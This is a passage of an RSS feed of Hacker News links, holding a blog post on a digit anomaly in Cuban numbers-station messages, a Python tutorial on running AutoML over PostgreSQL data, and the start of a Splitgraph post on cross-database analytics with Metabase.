None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515717</guid>
            <pubDate>Fri, 18 Sep 2020 12:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: PostgreSQL and Machine Learning - step-by-step python tutorial]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515598">thread link</a>) | @pplonski86
<br/>
September 18, 2020 | https://mljar.com/blog/postgresql-machine-learning/ | <a href="https://web.archive.org/web/*/https://mljar.com/blog/postgresql-machine-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<p><img src="https://raw.githubusercontent.com/mljar/mljar-examples/master/media/PostgreSQL_AutoML_v2.png" alt="PostgreSQL and Machine Learning"></p>

<p>I will show you how to apply Machine Learning algorithms on data from the PostgreSQL database to get insights and predictions. I will use an Automated Machine Learning (AutoML) <a href="https://github.com/mljar/mljar-supervised"><strong>supervised</strong></a>. It is an open-source python package. Thanks to AutoML I will get quick access to many ML algorithms: Decision Tree, Logistic Regression, Random Forest, Xgboost, Neural Network. The AutoML will handle feature engineering as well. I will show you python code snippets that can be reused to integrate Machine Learning with PostgreSQL as a part of the ETL pipeline.</p>

<p>You can find all the code used in this post in the <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML">GitHub</a>.</p>

<hr>

<h2 id="the-marketing-data">The marketing data</h2>

<p>I will use <a href="https://www.kaggle.com/yufengsui/portuguese-bank-marketing-data-set"><strong>Portugese Bank Marketing</strong></a> dataset (<code>bank_cleaned.csv</code> file). This dataset is about the marketing campaigns, which aim to promote financial products for existing customers of a Portuguese bank. The each contact to the client is described by:</p>

<div><div><pre><code><span>columns</span> <span>=</span> <span>[</span><span>"age"</span><span>,</span> <span>"job"</span><span>,</span> <span>"marital"</span><span>,</span> <span>"education"</span><span>,</span> <span>"default_payment"</span><span>,</span> <span>"balance"</span><span>,</span> <span>"housing"</span><span>,</span>
           <span>"loan"</span><span>,</span> <span>"day"</span><span>,</span> <span>"month"</span><span>,</span> <span>"duration"</span><span>,</span> <span>"campaign"</span><span>,</span> <span>"pdays"</span><span>,</span> <span>"previous"</span><span>,</span> <span>"poutcome"</span>
           <span>"response"</span> <span># the target</span>
          <span>]</span>
</code></pre></div></div>

<p>The <code>response</code> is the taget column, which contains the information if customer subscribed to the financial product. The goal of the analysis will be to predict whether customer will select the subscription.</p>

<p>In this analysis I will split the dataset into:</p>

<ul>
  <li>training data (<code>32,672</code> samples),</li>
  <li>testing data (<code>8,169</code> samples).</li>
</ul>

<p>All datasets are inserted into database, but <strong>for testing data the <code>response</code> is not inserted</strong>.</p>

<h2 id="setup-postgresql-database-in-docker">Setup PostgreSQL database in Docker</h2>

<p>I will set-up the PostgreSQL database in the docker.</p>

<p>The <code>Dockerfile</code> with PostgreSQL:</p>

<div><div><pre><code>FROM postgres:alpine
EXPOSE 5555
</code></pre></div></div>

<p>To build docker image and run container:</p>

<div><div><pre><code>docker build -t mydb:latest .
docker run --name my_local_db -e POSTGRES_PASSWORD=1234 -e POSTGRES_DB=db -p 5555:5432 mydb:latest
</code></pre></div></div>

<h2 id="create-table-and-insert-the-training-data">Create table and insert the training data</h2>

<p>For interacting with the database I will use python scripts and <code>psycopg2</code> package. To initialize the database please use the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/init_db.py"><code>init_db.py</code></a> file. Let‚Äôs dig into the code.</p>

<div><div><pre><code><span>""" init_db.py file """</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>from</span> <span>sklearn.model_selection</span> <span>import</span> <span>train_test_split</span>
<span>from</span> <span>db</span> <span>import</span> <span>db_engine</span> 

<span>create_table_sql</span> <span>=</span> <span>"""
CREATE TABLE IF NOT EXISTS marketing (
    id serial PRIMARY KEY,
    age integer,
    job varchar(128),
    marital varchar(128),
    education varchar(128),
    default_payment varchar(128),
    balance integer,
    housing varchar(128),
    loan varchar(128),
    day integer,
    month varchar(128),
    duration real,
    campaign integer, 
    pdays integer,
    previous integer,
    poutcome varchar(128),
    response varchar(128),
    predicted_response varchar(128)
)
"""</span>

<span>get_data_sql</span> <span>=</span> <span>"""select * from marketing"""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>read_csv</span><span>(</span><span>"data/bank_cleaned.csv"</span><span>,</span> <span>index_col</span><span>=</span><span>"id"</span><span>)</span>
<span>df</span><span>.</span><span>drop</span><span>(</span><span>"response_binary"</span><span>,</span> <span>axis</span><span>=</span><span>1</span><span>,</span> <span>inplace</span><span>=</span><span>True</span><span>)</span>
<span>df</span><span>[</span><span>"predicted_response"</span><span>]</span> <span>=</span> <span>""</span>
<span>test_size</span><span>=</span> <span>0.20</span> <span># 20% for testing</span>
<span>df_train</span><span>,</span> <span>df_test</span> <span>=</span> <span>train_test_split</span><span>(</span><span>df</span><span>,</span> <span>test_size</span><span>=</span><span>test_size</span><span>,</span> <span>random_state</span><span>=</span><span>1234</span><span>)</span>
<span>df_train</span><span>.</span><span>to_csv</span><span>(</span><span>"data/train.csv"</span><span>)</span>
<span>df_test</span><span>.</span><span>to_csv</span><span>(</span><span>"data/test.csv"</span><span>)</span>
<span>df_test</span> <span>=</span> <span>df_test</span><span>.</span><span>copy</span><span>()</span>
<span>df_test</span><span>[</span><span>"response"</span><span>]</span> <span>=</span> <span>""</span>

<span>df</span> <span>=</span> <span>pd</span><span>.</span><span>concat</span><span>([</span><span>df_train</span><span>,</span> <span>df_test</span><span>])</span>

<span>try</span><span>:</span>
    <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
    <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
    <span>print</span><span>(</span><span>"Create marketing table"</span><span>)</span>
    <span>cur</span><span>.</span><span>execute</span><span>(</span><span>create_table_sql</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert train and test data into table ..."</span><span>)</span>
    <span>buffer</span> <span>=</span> <span>StringIO</span><span>()</span>
    <span>df</span><span>.</span><span>to_csv</span><span>(</span><span>buffer</span><span>,</span> <span>index_label</span><span>=</span><span>"id"</span><span>,</span> <span>header</span><span>=</span><span>False</span><span>)</span>
    <span>buffer</span><span>.</span><span>seek</span><span>(</span><span>0</span><span>)</span>
    <span>cur</span><span>.</span><span>copy_from</span><span>(</span><span>buffer</span><span>,</span> <span>"marketing"</span><span>,</span> <span>sep</span><span>=</span><span>","</span><span>)</span>
    <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>print</span><span>(</span><span>"Insert finished."</span><span>)</span>

    <span>cur</span><span>.</span><span>close</span><span>()</span>
<span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
    <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>The code is doing three things:</p>

<ol>
  <li>Create the <code>marketing</code> table if it not exists.</li>
  <li>Split the data into train and test sets (<code>80%/20%</code> split). Datasets are saved to the disk.</li>
  <li>Datasets are inserted into table in the database. The <code>response</code> values is removed from test samples.</li>
</ol>

<p>The data is in the database. Let‚Äôs log into PostgreSQL to check:</p>

<div><div><pre><code>&gt; psql -U postgres -d db --host=0.0.0.0 --port=5555 

db=# select count(*) from marketing;
 count 
-------
 40841
(1 row)

db=# select response, count(*) from marketing group by response;
 response | count 
----------+-------
 no       | 28952
          |  8169
 yes      |  3720
(3 rows)
</code></pre></div></div>

<h2 id="lets-train-the-machine-learning-models">Let‚Äôs train the Machine Learning models!</h2>

<p>To integrate PostgreSQL with Machine Learning we will need:</p>

<ul>
  <li>method to get training data - <code>get_train_data()</code>,</li>
  <li>method to get live data (for computing predictions) - <code>get_live_data()</code>,</li>
  <li>method to insert predictions into the database - <code>insert_predictions(predictions, ids)</code>,</li>
  <li>method to get predictions (to compute the accuracy) - <code>get_predictions()</code>.</li>
</ul>

<p>I‚Äôve created <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/db.py"><code>db.py</code></a> file to communicate with the database (with <code>psychopg2</code>):</p>

<div><div><pre><code> <span>""" db.py file """</span>
 <span>""" Database API """</span>
<span>import</span> <span>json</span>
<span>import</span> <span>numpy</span> <span>as</span> <span>np</span>
<span>import</span> <span>pandas</span> <span>as</span> <span>pd</span>
<span>import</span> <span>psycopg2</span>
<span>from</span> <span>io</span> <span>import</span> <span>StringIO</span>

<span>def</span> <span>db_engine</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>host</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"host"</span><span>]</span>
    <span>port</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"port"</span><span>]</span>
    <span>user</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"user"</span><span>]</span>
    <span># password should be hidden in production setting</span>
    <span># do not store it in config.json</span>
    <span>password</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"password"</span><span>]</span>
    <span>db</span> <span>=</span> <span>config</span><span>[</span><span>"connection"</span><span>][</span><span>"db"</span><span>]</span>

    <span>return</span> <span>"user='{}' password='{}' host='{}' port='{}' dbname='{}'"</span><span>.</span><span>format</span><span>(</span>
        <span>user</span><span>,</span> <span>password</span><span>,</span> <span>host</span><span>,</span> <span>port</span><span>,</span> <span>db</span>
    <span>)</span>

<span>def</span> <span>sql_to_df</span><span>(</span><span>sql_query</span><span>):</span>
    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>cur</span><span>.</span><span>execute</span><span>(</span><span>sql_query</span><span>)</span>
        <span>df</span> <span>=</span> <span>pd</span><span>.</span><span>DataFrame</span><span>(</span><span>cur</span><span>.</span><span>fetchall</span><span>(),</span> <span>columns</span><span>=</span><span>[</span><span>elt</span><span>[</span><span>0</span><span>]</span> <span>for</span> <span>elt</span> <span>in</span> <span>cur</span><span>.</span><span>description</span><span>])</span>
        <span>cur</span><span>.</span><span>close</span><span>()</span>
        <span>return</span> <span>df</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
    
    <span>return</span> <span>None</span>


<span>def</span> <span>get_train_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features+[target])} from {table} where {target} != ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>target</span><span>]</span>
    
    
<span>def</span> <span>get_live_data</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>features</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"features"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join(features + [id_column])} from {table} where {target} = '' and {predicted} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span><span>,</span> <span>None</span>
    <span>return</span> <span>df</span><span>[</span><span>features</span><span>],</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>


<span>def</span> <span>get_predictions</span><span>():</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>target</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"target"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>
    <span>get_data_sql</span> <span>=</span> <span>f</span><span>"select {','.join([predicted] + [id_column])} from {table} where {target} = ''"</span>
    <span>df</span> <span>=</span> <span>sql_to_df</span><span>(</span><span>get_data_sql</span><span>)</span>
    <span>if</span> <span>df</span> <span>is</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>df</span><span>.</span><span>index</span> <span>=</span> <span>df</span><span>[</span><span>id_column</span><span>]</span>
    <span>return</span> <span>df</span>
    
<span>def</span> <span>insert_predictions</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>):</span>
    <span>config</span> <span>=</span> <span>json</span><span>.</span><span>load</span><span>(</span><span>open</span><span>(</span><span>"config.json"</span><span>))</span>
    <span>table</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"table"</span><span>]</span>
    <span>predicted</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"predicted"</span><span>]</span>
    <span>id_column</span> <span>=</span> <span>config</span><span>[</span><span>"automl"</span><span>][</span><span>"id"</span><span>]</span>

    <span>try</span><span>:</span>
        <span>conn</span> <span>=</span> <span>psycopg2</span><span>.</span><span>connect</span><span>(</span><span>db_engine</span><span>())</span>
        <span>cur</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>
        <span>tuples</span> <span>=</span> <span>list</span><span>(</span><span>zip</span><span>(</span><span>predictions</span><span>,</span> <span>ids</span><span>))</span>
        <span>sql_query</span> <span>=</span> <span>f</span><span>"update {table} set {predicted} = </span><span>%</span><span>s where {id_column} = </span><span>%</span><span>s"</span>
        <span>cur</span><span>.</span><span>executemany</span><span>(</span><span>sql_query</span><span>,</span> <span>tuples</span><span>)</span>
        <span>conn</span><span>.</span><span>commit</span><span>()</span>
    <span>except</span> <span>Exception</span> <span>as</span> <span>e</span><span>:</span>
        <span>print</span><span>(</span><span>"Problems:"</span><span>,</span> <span>str</span><span>(</span><span>e</span><span>))</span>
</code></pre></div></div>

<p>You can see that all information needed to connect and to get data is loaded from <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/config.json"><code>config.json</code></a> file:</p>

<div><div><pre><code>{
    "connection": {
        "host": "0.0.0.0",
        "port": 5555,
        "user": "postgres",
        "password": "1234",
        "db": "db"
    },
    "automl": {
        "table": "marketing",
        "features": [
            "age",
            "job",
            "marital",
            "education",
            "default_payment",
            "balance",
            "housing",
            "loan",
            "day",
            "month",
            "duration",
            "campaign",
            "pdays",
            "previous",
            "poutcome"
        ],
        "target": "response",
        "predicted": "predicted_response",
        "id": "id"
    }
}
</code></pre></div></div>

<ul>
  <li>This file contains connection details (<code>host</code>, <code>port</code>, <code>user</code>, <code>password</code>, <code>db</code>).</li>
  <li>Additionaly, it defines the data source for Machine Learning (<code>table</code> parameter). The <code>features</code> describe the AutoML input, <code>target</code> - the AutoML output, <code>predicted</code> -  the name of the column where predictions will be stored, and <code>id</code> is the index column.</li>
  <li>You can resuse this file to define your own integration of PostgreSQL with AutoML.</li>
  <li>The password is in the config file just for example purposes. In production setting, it should be hidden (as environment variable).</li>
</ul>

<h2 id="lets-train-automl">Let‚Äôs train AutoML</h2>

<p>You might find it suprissing but there are only <code>5</code> lines of code in the <a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/train_automl.py"><code>train_automl.py</code></a> file:</p>

<div><div><pre><code><span>""" train_automl.py file """</span>
<span>from</span> <span>db</span> <span>import</span> <span>get_train_data</span>
<span>from</span> <span>supervised</span> <span>import</span> <span>AutoML</span>

<span># get the training data</span>
<span>X_train</span><span>,</span> <span>y_train</span> <span>=</span> <span>get_train_data</span><span>()</span>
<span># train AutoML</span>
<span>automl</span> <span>=</span> <span>AutoML</span><span>(</span><span>results_path</span><span>=</span><span>"Response_Classifier"</span><span>)</span>
<span>automl</span><span>.</span><span>fit</span><span>(</span><span>X_train</span><span>,</span> <span>y_train</span><span>)</span>
</code></pre></div></div>

<p>This code gets data for training from the database and <code>fit()</code> AutoML object. The result of the AutoML are saved in <a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier"><code>Response_Classifier</code></a> directory. All models and preprocessing details are <strong>automatically saved</strong> to the hard drive. Additionally, the <code>README.md</code> Markdown reports are created for AutoML and each Machine Learning model. You can check them on GitHub, here are links for few examples:</p>

<ul>
  <li><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier#automl-leaderboard">AutoML leaderboard report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Decision Tree report</a>,</li>
  <li><a href="https://github.com/mljar/integrations/blob/master/PostgreSQL_AutoML/Response_Classifier/5_Default_Xgboost/README.md">Xgboost report</a>.</li>
</ul>

<table>
  <thead>
    <tr>
      <th>Best model</th>
      <th>name</th>
      <th>model_type</th>
      <th>metric_type</th>
      <th>metric_value</th>
      <th>train_time</th>
      <th>Link</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
      <td>1_Baseline</td>
      <td>Baseline</td>
      <td>logloss</td>
      <td>0.354508</td>
      <td>0.32</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/1_Baseline/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>2_DecisionTree</td>
      <td>Decision Tree</td>
      <td>logloss</td>
      <td>0.269144</td>
      <td>15.8</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/2_DecisionTree/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>3_Linear</td>
      <td>Linear</td>
      <td>logloss</td>
      <td>0.237079</td>
      <td>7.45</td>
      <td><a href="https://github.com/mljar/integrations/tree/master/PostgreSQL_AutoML/Response_Classifier/3_Linear/README.md">Results link</a></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td>4_Default_R‚Ä¶</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mljar.com/blog/postgresql-machine-learning/">https://mljar.com/blog/postgresql-machine-learning/</a></em></p>]]>
            </description>
            <link>https://mljar.com/blog/postgresql-machine-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515598</guid>
            <pubDate>Fri, 18 Sep 2020 11:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dogfooding Splitgraph for cross-database analytics in Metabase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24515353">thread link</a>) | @mildbyte
<br/>
September 18, 2020 | https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase | <a href="https://web.archive.org/web/*/https://www.splitgraph.com/blog/splitgraph-matomo-elasticsearch-metabase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><article><div><nav><ol><li><a href="#our-analytics-stack" as="#our-analytics-stack">Our analytics stack</a></li><li><a href="#how-to-bring-the-data-together" as="#how-to-bring-the-data-together">How to bring the data together?</a></li><li><a href="#sample-queries" as="#sample-queries">Sample queries</a><ol><li><a href="#federated-join" as="#federated-join">Federated JOIN</a></li></ol></li><li><a href="#data-modelling" as="#data-modelling">Data modelling</a></li><li><a href="#metabase" as="#metabase">Metabase</a><ol><li><a href="#setting-up" as="#setting-up">Setting up</a></li><li><a href="#insights" as="#insights">Insights</a></li></ol></li><li><a href="#conclusion" as="#conclusion">Conclusion</a></li></ol></nav><p><a href="https://www.splitgraph.com/" as="https://www.splitgraph.com">Splitgraph</a> is powered by data. We use <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> to build BI dashboards that can answer questions about how people interact with us. These dashboards reference our Web analytics data, user data and all events happening across the estate. We can find out how many people queried the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> on a given week, how they found Splitgraph, or if they ever pulled a data image.</p><p>This works without any ETL pipelines or a data warehouse. How do we do it?</p><p>Well, we use Splitgraph.</p><p>In this post, we'll talk about our analytics stack. We'll discuss how we use Splitgraph's <a href="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction" as="https://www.splitgraph.com/docs/ingesting-data/foreign-data-wrappers/introduction"><code>sgr mount</code></a> command to proxy to data from Matomo, Elasticsearch and PostgreSQL. We'll show a sample SQL query that runs a federated JOIN between these three databases. Finally, we'll talk about how we use Metabase to get a clear view of the business.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/00-diagram.png"><em>Architecture diagram of our analytics setup.</em></p><section><h2 id="our-analytics-stack">Our analytics stack</h2><p>We hate third-party trackers. At the same time, we would like to know what's happening on the website and across the company in general. In the age of CDNs, a visit to a website might never reach the origin server. HTTP server logs won't show the full story about website visitors.</p><p>To solve that, we started using <strong><a href="https://matomo.org/" as="https://matomo.org/">Matomo</a></strong>. Matomo is an open-source web analytics platform. It offers a similar interface and feature set to Google Analytics. However, unlike GA, it stores all data locally in a MySQL database.</p><p>Besides visiting the website, there's a lot of other ways users can interact with Splitgraph. For example:</p><ul><li>Starring Splitgraph on GitHub or downloading a release</li><li>Querying the Splitgraph <a href="https://www.splitgraph.com/connect" as="https://www.splitgraph.com/connect">Data Delivery Network</a> from an SQL client</li><li>Pushing and pulling <a href="https://splitgraph.com/docs/concepts/images" as="https://splitgraph.com/docs/concepts/images">data images</a> to/from Splitgraph</li><li>Using the <a href="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api" as="https://www.splitgraph.com/docs/splitgraph-cloud/publish-rest-api">REST API</a></li><li>Checking for updates: we use this to estimate the number of active <code>sgr</code> users</li></ul><p>We use <strong>Elasticsearch</strong> to log these and other interesting events.</p><p>Finally, we have a <strong>PostgreSQL</strong> database that stores actual user data. Some of it could be useful to know in an analytics context. For example: a user's primary e-mail address or their GitHub ID.</p></section><section><h2 id="how-to-bring-the-data-together">How to bring the data together?</h2><p>The idea for this setup came to us when we were trying to get some data from the Matomo Web UI. While it is pretty powerful, it's limited in the kinds of reports it can produce. Also, data we'd see in Matomo didn't include anything we store in Elasticsearch.</p><p>We wondered if we could query the data from Matomo's MySQL database directly. The <a href="https://developer.matomo.org/guides/database-schema" as="https://developer.matomo.org/guides/database-schema">schema</a>, albeit complex, is well documented on their website.</p><p>We could ingest data into Elasticsearch. However, we were already using Kibana to visualize Elasticsearch data and its visualizations were sometimes frustrating to use. Basic functionality like plotting sums is only available through scripted Elasticsearch fields.</p><p><img src="https://raw.githubusercontent.com/splitgraph/splitgraph.com/master/content/blog/images/20200918-splitgraph-matomo-elasticsearch-metabase/01-kibana.png"><em>Pictured: five different visualization engines that Kibana lets you use</em></p><p>But then we thought about it some more. Splitgraph itself is built on top of PostgreSQL. One of its features is making PostgreSQL <a href="https://www.splitgraph.com/blog/foreign-data-wrappers" as="https://www.splitgraph.com/blog/foreign-data-wrappers">foreign data wrappers</a> more user-friendly. Splitgraph's <code>sgr mount</code> lets you instantiate an FDW with a single command. You can then query the data directly or snapshot it.</p><p>Could we use a Splitgraph instance and add a MySQL FDW to it to query Matomo data?</p><p>And if we did, could we use an Elasticsearch FDW to proxy to our events data?</p><p>And if we did that, could we use something like <a href="https://www.metabase.com/" as="https://www.metabase.com/">Metabase</a> and point it at Splitgraph, letting it query data across all our data silos?</p><p>Turns out, we could. Here's an abridged version of how we mount Matomo data on a Splitgraph instance. We have a full set of commands on <a href="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics" as="https://github.com/splitgraph/splitgraph/tree/master/examples/cross-db-analytics">our GitHub</a>.</p><pre><code>sgr mount mysql_fdw matomo_raw -c matomo:$PASSWORD@matomo-db -o@- &lt;&lt;EOF
{
  "remote_schema": "matomo",
  "tables": {
    "matomo_log_action": {
      "hash": "bigint",
      "idaction": "integer",
      "name": "character varying(4096)",
      "type": "smallint",
      "url_prefix": "smallint"
    },
    "matomo_log_visit": {
      "idvisit": "bigint",
      "idvisitor": "bytea",
      "user_id": "character varying(200)",
      "location_ip": "bytea",
      "referer_url": "text",
      "visit_entry_idaction_name": "integer",
      "visit_entry_idaction_url": "integer",
      "visit_exit_idaction_name": "integer",
      "visit_exit_idaction_url": "integer",
      "visit_first_action_time": "timestamp without time zone",
      "visit_last_action_time": "timestamp without time zone",
      "visit_total_actions": "integer",
